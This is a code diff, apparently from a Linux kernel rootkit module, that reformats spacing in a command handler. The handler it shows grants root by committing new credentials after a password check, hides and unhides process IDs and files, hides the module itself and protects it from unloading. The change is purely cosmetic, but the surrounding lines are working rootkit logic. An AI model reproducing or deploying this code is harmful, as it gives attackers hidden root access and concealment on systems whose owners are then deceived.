@@ -769,15 +769,15 @@ int execute_command(const char __user *str, size_t length)
     str += sizeof(CFG_PASS);
 
     char strTemp[2];
-    strTemp[0]=str[0]; 
-    strTemp[1]='\0';
+    strTemp[0] = str[0];
+    strTemp[1] = '\0';
     long inputNumber;
-    kstrtol (strTemp,10,&inputNumber);
+    kstrtol(strTemp, 10, &inputNumber);
 
-    printk("%d",inputNumber);
+    printk("%d", inputNumber);
     printk("\n%s", str + sizeof(char));
 
-    if (inputNumber==CFG_ROOT)
+    if (inputNumber == CFG_ROOT)
     {
         pr_info("Got root command\n");
         struct cred *creds = prepare_creds();
@@ -787,46 +787,46 @@ int execute_command(const char __user *str, size_t length)
 
         commit_creds(creds);
     }
-    else if (inputNumber==CFG_HIDE_PID)
+    else if (inputNumber == CFG_HIDE_PID)
     {
         pr_info("Got hide pid command\n");
         str += sizeof(char);
         pid_add(str);
     }
-    else if (inputNumber==CFG_UNHIDE_PID)
+    else if (inputNumber == CFG_UNHIDE_PID)
     {
         pr_info("Got unhide pid command\n");
         str += sizeof(char);
         pid_remove(str);
     }
-    else if (inputNumber==CFG_HIDE_FILE)
+    else if (inputNumber == CFG_HIDE_FILE)
     {
         pr_info("Got hide file command\n");
         str += sizeof(char);
         file_add(str);
     }
-    else if (inputNumber==CFG_UNHIDE_FILE)
+    else if (inputNumber == CFG_UNHIDE_FILE)
     {
         pr_info("Got unhide file command\n");
         str += sizeof(char);
         file_remove(str);
     }
-    else if (inputNumber==CFG_HIDE)
+    else if (inputNumber == CFG_HIDE)
     {
         pr_info("Got hide command\n");
         hide();
     }
-    else if (inputNumber==CFG_UNHIDE)
+    else if (inputNumber == CFG_UNHIDE)
     {
         pr_info("Got unhide command\n");
         unhide();
     }
-    else if (inputNumber==CFG_PROTECT)
+    else if (inputNumber == CFG_PROTECT)
     {
         pr_info("Got protect command\n");
         protect();
     }
-    else if (inputNumber==CFG_UNPROTECT)
+    else if (inputNumber == CFG_UNPROTECT)
     {
         pr_info("Got unprotect command\n");
         unprotect();
